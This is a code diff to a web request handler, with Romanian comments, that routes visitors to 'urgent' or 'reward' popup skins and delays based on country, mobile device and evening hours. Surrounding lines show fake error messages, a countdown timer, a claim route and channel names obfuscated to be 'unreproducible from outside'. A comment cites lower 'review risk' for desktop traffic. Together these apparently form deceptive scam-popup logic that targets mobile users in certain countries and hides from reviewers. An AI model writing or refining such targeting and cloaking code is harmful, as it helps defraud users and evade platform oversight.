@@ -88,10 +88,53 @@ export async function onRequest(context) {
   const errIdx = Math.floor(Math.random() * errorMessages.length);
   const chosenError = errorMessages[errIdx];
 
-  // === AB VARIANT (consistent per UID) ===
-  const abVariant   = simpleHash(uid) % 3;
-  const abDelays    = [18000, 20000, 22000];
-  const abDelay     = abDelays[abVariant];
+  // === DYNAMIC ROUTING — skin + delay per profil user ===
+  // Semnale disponibile: country, ua, ora serverului
+  const hourUTC   = new Date(ts).getUTCHours();
+  const isMobile  = /android|iphone|ipad|mobile/i.test(ua);
+  const isAndroid = /android/i.test(ua);
+  const isIOS     = /iphone|ipad/i.test(ua);
+  const isEveningUTC = hourUTC >= 17 && hourUTC <= 22; // 20-01 ora RO (UTC+2/+3)
+  const isMorningUTC = hourUTC >= 5  && hourUTC <= 9;  // 08-12 ora RO
+
+  // Țări cu engagement ridicat în seara (peak traffic)
+  const highEngagementCountries = ['RO','MD','HU','BG','RS'];
+  const isHighEng = highEngagementCountries.includes(country);
+
+  // Router: scoring simplu → skin + delay optim
+  let chosenSkin  = 'skin-minimal'; // default
+  let chosenDelay = 20000;          // default
+
+  if (isHighEng && isMobile && isEveningUTC) {
+    // Peak: RO/MD/BG Android seara — urgent + delay scurt
+    chosenSkin  = 'skin-urgent';
+    chosenDelay = 18000;
+  } else if (isHighEng && isIOS && isEveningUTC) {
+    // Peak iOS: reward funcționează mai bine pe iOS seara
+    chosenSkin  = 'skin-reward';
+    chosenDelay = 19000;
+  } else if (isHighEng && isMorningUTC) {
+    // Dimineața: mai conservator, minimal
+    chosenSkin  = 'skin-minimal';
+    chosenDelay = 22000;
+  } else if (!isHighEng && isMobile && isEveningUTC) {
+    // Țări secundare (PL, CZ, SK) seara mobile
+    chosenSkin  = 'skin-reward';
+    chosenDelay = 20000;
+  } else if (isMobile) {
+    // Orice alt mobile — urgent ușor
+    chosenSkin  = 'skin-urgent';
+    chosenDelay = 20000;
+  }
+  // Desktop sau necunoscut → minimal + 22s (trafic slab, review risc mai mic)
+  if (!isMobile) {
+    chosenSkin  = 'skin-minimal';
+    chosenDelay = 22000;
+  }
+
+  // AB variant păstrat pentru compatibilitate backward (analytics)
+  const abVariant = simpleHash(uid) % 3;
+  const abDelay   = chosenDelay; // acum vine din router, nu din hash
 
   // === CHANNEL SEED (obfuscare BroadcastChannel + IndexedDB names) ===
   // seed = primele 8 chars din uid → channel names unice per user, ireproductibile din exterior
@@ -122,10 +165,11 @@ export async function onRequest(context) {
   window.__STATE_UID    = ${JSON.stringify(uid)};
   window.__ERROR_TITLE  = ${JSON.stringify(chosenError.title)};
   window.__ERROR_SUB    = ${JSON.stringify(chosenError.sub)};
-  window.__ab           = { variantIndex: ${abVariant}, delay: ${abDelay} };
+  window.__ab           = { variantIndex: ${abVariant}, delay: ${abDelay}, skin: ${JSON.stringify(chosenSkin)} };
   window.__CONFIG       = {
     POPUP_DELAY_MS:      ${abDelay},
     POPUP_COUNTDOWN_S:   300,
+    POPUP_SKIN:          ${JSON.stringify(chosenSkin)},
     CLAIM_ROUTE:         '/c',
     HEALTH_ROUTE:        '/h',
     EVENT_ROUTE:         '/e',
